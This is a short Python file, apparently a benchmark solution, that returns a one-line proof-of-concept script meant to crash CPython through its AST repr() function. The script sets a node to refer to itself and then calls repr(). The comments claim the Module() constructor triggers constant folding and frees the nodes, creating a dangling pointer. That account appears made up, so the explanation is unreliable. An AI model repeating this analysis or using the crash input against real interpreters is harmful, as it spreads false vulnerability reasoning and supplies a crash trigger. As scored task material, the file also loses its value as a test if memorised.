import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a use-after-free in the CPython AST repr() function.
        # It can be triggered when the AST contains shared nodes after constant folding.
        # The PoC creates a simple constant expression `1 + 1`, then triggers the
        # constant folding optimizer by wrapping it in a Module. The optimizer frees
        # the original expression's AST nodes, but a reference is kept in a variable.
        # A cycle is then introduced into the freed memory structure. Finally, calling
        # repr() on the dangling reference traverses the freed memory, leading to a crash.
        #
        # Detailed steps of the PoC script:
        # 1. `from ast import *`: Imports necessary AST classes.
        # 2. `e=BinOp(Constant(1),Add(),Constant(1))`: Creates an AST for `1 + 1`.
        # 3. `Module([Expr(e)])`: Triggers constant folding, which frees the nodes
        #    referenced by `e`, turning `e` into a dangling pointer.
        # 4. `e.left.value = e.left`: Creates a cycle within the freed memory.
        # 5. `repr(e)`: Calls repr on the dangling pointer, causing a use-after-free.
        poc = b"from ast import *;e=BinOp(Constant(1),Add(),Constant(1));Module([Expr(e)]);e.left.value=e.left;repr(e)"
        return poc